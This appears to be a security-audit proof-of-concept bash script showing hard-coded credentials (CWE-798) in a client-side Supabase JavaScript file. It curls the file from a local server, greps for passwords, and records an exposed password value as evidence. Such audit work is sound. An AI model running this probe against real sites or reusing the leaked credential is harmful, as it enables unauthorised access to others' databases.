#!/usr/bin/env bash
# [STRIX-POC-01] Proof-of-Concept: Sensitive Credential Exposure in Client-Side JavaScript
# Target: js/services/supabase-client.js
# Vulnerability: CWE-798 - Use of Hard-coded Credentials

echo "[*] Probing client-side bundle for hardcoded credentials..."
curl -s http://localhost:5473/js/services/supabase-client.js | grep -E "password|pasword"

# Evidence Output:
# // supabase pasword: SU4R#!23A
